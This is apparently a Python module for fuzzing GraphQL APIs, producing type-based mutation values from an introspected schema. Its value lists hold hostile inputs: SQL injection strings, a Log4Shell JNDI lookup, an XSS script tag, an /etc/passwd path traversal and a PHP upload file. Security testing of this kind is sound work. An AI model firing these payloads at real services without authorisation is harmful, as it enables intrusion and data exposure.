"""
Type-based parameter mutation for GraphQL fuzzing.
"""

import random
import string
from datetime import datetime, timedelta
from typing import Any, Dict, List, Optional, Set, TypeVar, Union

T = TypeVar('T')

class TypeMutator:
    """
    Mutates GraphQL parameters based on their types to test for vulnerabilities.
    """
    
    def __init__(self, schema: Optional[Dict[str, Any]] = None):
        """
        Initialize the type mutator with an optional schema.
        
        Args:
            schema: The GraphQL schema for type information
        """
        self.schema = schema or {}
        self._type_cache: Dict[str, Dict[str, Any]] = {}
        self._build_type_cache()
        
        # Common fuzzing values for different types
        self._common_strings = [
            "",  # Empty string
            "'\"",  # Quotes
            "' OR '1'='1",  # SQLi
            "${jndi:ldap://example.com/a}",  # Log4Shell
            "<script>alert(1)</script>",  # XSS
            "../../../../etc/passwd",  # Path traversal
            "%s%s%s%s",  # Format string
            "😀",  # Unicode emoji
            "A" * 1000,  # Long string
            None  # Null
        ]
        
        self._common_ints = [
            0, 1, -1,  # Edge cases
            2147483647, -2147483648,  # 32-bit limits
            9223372036854775807, -9223372036854775808,  # 64-bit limits
            999999999999999999999999999999999999999999999999999999999999,  # Very large number
            0.1,  # Float instead of int
            "1",  # String instead of int
            None  # Null
        ]
        
        self._common_floats = [
            0.0, 1.0, -1.0,  # Basic cases
            1.0e-100, 1.0e100,  # Very small/large numbers
            float('inf'), float('-inf'), float('nan'),  # Special values
            "1.0",  # String instead of float
            None  # Null
        ]
        
        self._common_booleans = [
            True, False,  # Standard values
            "true", "false",  # String representations
            1, 0,  # Numeric representations
            "True", "False",  # Python string booleans
            None  # Null
        ]
        
        self._common_ids = [
            "1", "0", "-1",  # Numeric IDs
            "00000000-0000-0000-0000-000000000000",  # Zero UUID
            "550e8400-e29b-41d4-a716-446655440000",  # Random UUID
            "admin", "root", "user",  # Common ID strings
            "' OR '1'='1",  # SQLi
            "<script>alert(1)</script>",  # XSS
            "../../../../etc/passwd",  # Path traversal
            None  # Null
        ]
        
        # Type to mutator method mapping
        self._type_handlers = {
            "String": self._mutate_string,
            "Int": self._mutate_int,
            "Float": self._mutate_float,
            "Boolean": self._mutate_boolean,
            "ID": self._mutate_id,
            "DateTime": self._mutate_datetime,
            "JSON": self._mutate_json,
            "Upload": self._mutate_upload
        }
    
    def _build_type_cache(self) -> None:
        """Build a cache of type information from the schema."""
        if not self.schema or "__schema" not in self.schema:
            return
            
        schema = self.schema["__schema"]
        
        # Cache all types
        for type_def in schema.get("types", []):
            type_name = type_def.get("name")
            if type_name and type_name.startswith("__"):
                continue  # Skip internal types
                
            self._type_cache[type_name] = type_def
    
    def get_type_definition(self, type_name: str) -> Optional[Dict[str, Any]]:
        """
        Get the definition of a type from the schema.
        
        Args:
            type_name: Name of the type to look up
            
        Returns:
            Type definition or None if not found
        """
        # Handle non-null and list types
        if type_name.endswith("!"):
            return self.get_type_definition(type_name[:-1])
        if type_name.startswith("[") and type_name.endswith("]"):
            return self.get_type_definition(type_name[1:-1])
            
        return self._type_cache.get(type_name)
    
    def get_possible_values(self, type_name: str) -> List[Any]:
        """
        Get possible mutation values for a given type.
        
        Args:
            type_name: Name of the type
            
        Returns:
            List of possible values for mutation
        """
        # Handle non-null and list types
        is_list = False
        is_non_null = False
        
        if type_name.endswith("!"):
            type_name = type_name[:-1]
            is_non_null = True
            
        if type_name.startswith("[") and type_name.endswith("]"):
            type_name = type_name[1:-1]
            is_list = True
        
        # Get the base type
        type_def = self.get_type_definition(type_name)
        if not type_def:
            return []
            
        # Handle different kinds of types
        kind = type_def.get("kind")
        
        if kind == "SCALAR":
            values = self._get_scalar_values(type_name)
        elif kind == "ENUM":
            values = [v["name"] for v in type_def.get("enumValues", [])]
        elif kind == "INPUT_OBJECT":
            # For input objects, generate a sample input
            values = [self._generate_input_object(type_def)]
        else:
            values = []
        
        # Handle list types
        if is_list:
            if not values:
                values = [[]]
            else:
                # Create lists of different sizes with different combinations of values
                values = [
                    [],  # Empty list
                    [random.choice(values)],  # Single item
                    random.choices(values, k=3),  # Multiple items
                    [v for v in values]  # All items
                ]
        
        # Filter out None values for non-null types
        if is_non_null:
            values = [v for v in values if v is not None]
        
        return values
    
    def _get_scalar_values(self, type_name: str) -> List[Any]:
        """Get mutation values for scalar types."""
        handler = self._type_handlers.get(type_name)
        if handler:
            return handler()
        
        # Default to string mutations for unknown types
        return self._mutate_string()
    
    def _mutate_string(self) -> List[str]:
        """Generate string mutations."""
        return self._common_strings
    
    def _mutate_int(self) -> List[Union[int, str, float, None]]:
        """Generate integer mutations."""
        return self._common_ints
    
    def _mutate_float(self) -> List[Union[float, str, int, None]]:
        """Generate float mutations."""
        return self._common_floats
    
    def _mutate_boolean(self) -> List[Union[bool, str, int, None]]:
        """Generate boolean mutations."""
        return self._common_booleans
    
    def _mutate_id(self) -> List[Union[str, int, None]]:
        """Generate ID mutations."""
        return self._common_ids
    
    def _mutate_datetime(self) -> List[Union[str, int, None]]:
        """Generate datetime mutations."""
        now = datetime.utcnow()
        return [
            now.isoformat(),  # Current time
            (now - timedelta(days=365)).isoformat(),  # One year ago
            (now + timedelta(days=365)).isoformat(),  # One year in the future
            "2020-01-01T00:00:00Z",  # Fixed date
            "invalid-date",  # Invalid date
            "0",  # Epoch
            str(int(now.timestamp())),  # Current timestamp as string
            None  # Null
        ]
    
    def _mutate_json(self) -> List[Union[Dict, List, str, int, bool, None]]:
        """Generate JSON mutations."""
        return [
            {},
            [],
            {"key": "value"},
            [1, 2, 3],
            "{\"key\": \"value\"}",  # JSON string
            "<script>alert(1)</script>",  # XSS
            "' OR '1'='1",  # SQLi
            None
        ]
    
    def _mutate_upload(self) -> List[Dict[str, Any]]:
        """Generate file upload mutations."""
        return [
            {"filename": "test.txt", "content": b"Hello, world!"},
            {"filename": "test.php", "content": b"<?php phpinfo(); ?>"},
            {"filename": "test.jpg", "content": b"\xff\xd8\xff\xe0\x00\x10JFIF"},  # Minimal JPEG
            {"filename": "test.pdf", "content": b"%PDF-1.4\n1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n2 0 obj\n<</Type/Pages/Kids[3 0 R]/Count 1>>\nendobj\n3 0 obj\n<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<</Font<</F1 4 0 R>>>>/Contents 5 0 R>>>>\nendobj\n4 0 obj\n<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>\nendobj\n5 0 obj\n<</Length 44>>\nstream\nBT\n/F1 24 Tf\n100 700 Td\n(Hello, world!) Tj\nET\nendstream\nendobj\nxref\n0 6\n0000000000 65535 f \n0000000009 00000 n \n0000000053 00000 n \n0000000102 00000 n \n0000000163 00000 n \n0000000196 00000 n \ntrailer\n<</Size 6/Root 1 0 R>>\nstartxref\n323\n%%EOF"},  # Minimal PDF
            None
        ]
    
    def _generate_input_object(self, type_def: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate a sample input object.
        
        Args:
            type_def: The input object type definition
            
        Returns:
            A dictionary representing the input object
        """
        result = {}
        
        for field in type_def.get("inputFields", []):
            field_name = field["name"]
            field_type = field["type"]
            
            # Skip fields that are marked as deprecated
            if field.get("isDeprecated", False):
                continue
            
            # Get possible values for the field type
            possible_values = self.get_possible_values(field_type["name"])
            
            # If we have possible values, pick one at random
            if possible_values:
                result[field_name] = random.choice(possible_values)
            else:
                # Otherwise, use a default value based on the type
                type_name = field_type.get("name", "String")
                if type_name == "String":
                    result[field_name] = "test"
                elif type_name == "Int":
                    result[field_name] = 1
                elif type_name == "Float":
                    result[field_name] = 1.0
                elif type_name == "Boolean":
                    result[field_name] = True
                elif type_name == "ID":
                    result[field_name] = "1"
        
        return result
    
    def mutate_arguments(
        self, 
        arguments: List[Dict[str, Any]],
        mutation_rate: float = 0.3
    ) -> Dict[str, Any]:
        """
        Mutate a set of GraphQL arguments.
        
        Args:
            arguments: List of argument definitions
            mutation_rate: Probability of mutating each argument (0.0 to 1.0)
            
        Returns:
            Dictionary of mutated arguments
        """
        result = {}
        
        for arg in arguments:
            arg_name = arg["name"]
            arg_type = arg["type"]
            
            # Skip if we're not mutating this argument
            if random.random() > mutation_rate:
                continue
            
            # Get possible values for the argument type
            possible_values = self.get_possible_values(arg_type["name"])
            
            # If we have possible values, pick one at random
            if possible_values:
                result[arg_name] = random.choice(possible_values)
        
        return result
